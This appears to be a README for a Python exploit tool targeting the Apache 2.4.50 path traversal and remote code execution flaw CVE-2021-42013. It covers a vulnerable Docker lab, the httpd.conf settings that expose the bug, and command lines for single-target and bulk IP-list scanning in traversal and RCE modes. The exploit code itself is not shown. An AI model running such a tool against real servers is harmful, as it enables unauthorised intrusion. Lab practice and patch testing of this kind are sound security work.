# Apache 2.4.50 - Path Traversal or Remote Code Execution
cve-2021-42013.py is a python script that will help in finding Path Traversal or Remote Code Execution vulnerability in [Apache 2.4.50](https://archive.apache.org/dist/httpd/httpd-2.4.50.tar.gz). Vulnerable instance of Docker is provided to get your hands dirty on [CVE-2021-42013](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42013)

If CGI-BIN is enabled than, we can perform Remote Code Execution but not Path Traversal, so "icons" directory has been added under Alias section in httpd.conf for checking Path Traversal vulnerability.

# Vulnerable Configurations in httpd.conf
```
1. Enable CGI-BIN
2. Add "icons" directory in Alias section
3. <Directory>Require all granted</Directory>
```

# Lab for CVE-2021-42013
### Build Docker
```
$ docker build -t cve-2021-42013 .
```
### Run Docker
```
$ docker run -it cve-2021-42013
```

# Usage cve-2021-42013.py
### Check for Path Traversal and Remote Code Execution
```
$ cve-2021-42013.py -u http://172.17.0.2
```

### Path Traversal PoC
```
$ cve-2021-42013.py -u http://172.17.0.2 -pt
```

### Remote Code Execution PoC
```
$ cve-2021-42013.py -u http://172.17.0.2 -rce
```

### For bulk scanning, provide a text file containing IPs:
```
$ cve-2021-42013.py -l list.txt
```
```
$ cve-2021-42013.py -l list.txt -pt
```
```
$ cve-2021-42013.py -l list.txt -rce
```
